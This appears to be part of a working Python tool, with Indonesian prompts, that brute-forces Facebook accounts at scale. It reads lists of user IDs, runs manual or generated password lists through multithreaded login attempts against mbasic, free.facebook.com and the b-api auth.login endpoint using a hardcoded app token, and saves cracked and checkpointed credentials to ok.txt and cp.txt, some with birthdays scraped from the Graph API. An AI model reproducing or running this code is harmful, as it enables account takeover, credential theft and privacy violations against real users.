		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

class crack:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
		while True:
			f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
		while True:
			f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
						m,d,y = ttl.split("/")
						m = bulan_ttl[m]
						print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s %s %s   "%(fl.get("id"),i,d,m,y)))
						self.cp.append("%s • %s • %s %s %s"%(fl.get("id"),i,d,m,y))
						open("cp.txt","a+").write("%s • %s • %s %s %s\n"%(fl.get("id"),i,d,m,y))
						break
					except(KeyError, IOError):
						m = " "
						d = " "
						y = " "
					except:pass
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackffb:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
		while True:
			f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=f_fb(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class bapi:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan PasswordManual [d/m]"))
    while True:
      f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
      if f in[""," "]:
        print((k+"["+p+"!"+k+"]"+p+" Nomor Invalid Kentod!!"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

class bapittl:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
    while True:
      f=input(k+"["+p+"•"+k+"]"+p+" Pilih : ")
      if f in[""," "]:
        print((k+"["+p+"!"+k+"]"+p+" Nomor Invalid Kentod!!"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Contoh : sayang,bismillah,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((k+"\n["+p+"+"+k+"]"+p+" Crack Berjalan, Tunggu Tod..."+k+"\n["+p+"+"+k+"]"+p+" Akun [OK] Tersimpan di : ok.txt"+k+"\n["+p+"+"+k+"]"+p+" Akun [CP] Tersimpan Di : cp.txt"+k+"\n["+p+"#"+k+"]"+p+" Jika tidak ada hasil, gunakan mode pesawat (3 detik)\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
          m,d,y = ttl.split("/")
          m = bulan_ttl[m]
          self.cp.append("%s • %s • %s %s %s"%(username,password,d,m,y))
          print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s %s %s %s   "%(username,password,d,m,y,N)))
          save = open("cp.txt", "a+")
          save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
          save.close()
          return True
        except(KeyError, IOError):
          m = " "
          d = " "
          y = " "
        except:pass
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s %s   "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m\x1b[0;31m[\x1b[0;37m%s/%s\x1b[0;31m]\x1b[0;32m[\x1b[0;37mOK:%s\x1b[0;32m]\x1b[0;33m[\x1b[0;37mCP:%s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

### RESULT ###

def results(Renocintasagiri,Krahkrah):
        if len(Renocintasagiri) !=0:
                print(("[OK] : "+str(len(renocintasagiri))))
        if len(Krahkrah) !=0:
                print(("[CP] : "+str(len(Krahkrah))))
        if len(renocintasagiri) ==0 and len(Krahkrah) ==0:
                print("\n")
                print((k+"["+p+"!"+k+"]"+p+" File Tidak Ada!!"))

def ress():
    os.system("clear")
    banner()
    print((k+"\n[ "+p+"Lihat Hasil Crack"+k+" ]"+p))
    print((h+"\n[ "+p+"OK"+h+" ]"+p))
    try:
        os.system("cat ok.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" File Tidak Ada!!"))
    print((k+"\n[ "+p+"CP"+k+" ]"+p))
    try:
        os.system("cat cp.txt")
    except IOError:
        print((k+"["+p+"!"+k+"]"+p+" File Tidak Ada"))
    input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
    menu()

if __name__=="__main__":
	os.system("git pull")
	country()